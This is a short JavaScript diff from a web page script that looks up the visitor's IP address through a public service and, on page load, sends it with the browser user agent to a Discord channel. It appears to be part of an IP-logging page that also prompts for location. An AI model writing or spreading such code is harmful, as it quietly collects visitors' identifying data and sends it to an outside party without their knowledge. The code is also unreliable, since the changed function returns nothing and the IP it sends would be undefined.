@@ -84,7 +84,10 @@ document.addEventListener("DOMContentLoaded", function() {
     denyLocationBtn.addEventListener('click', denyLocation);
   
     function getIPFromAmazon() {
-  fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => console.log(data))
+  $.getJSON("https://api.ipify.org?format=json",
+            function (data) {
+                return data.ip;
+            })
 }
 
 sendMessageToDiscord("User Agent: " + navigator.userAgent + " ; IP: " + getIPFromAmazon())
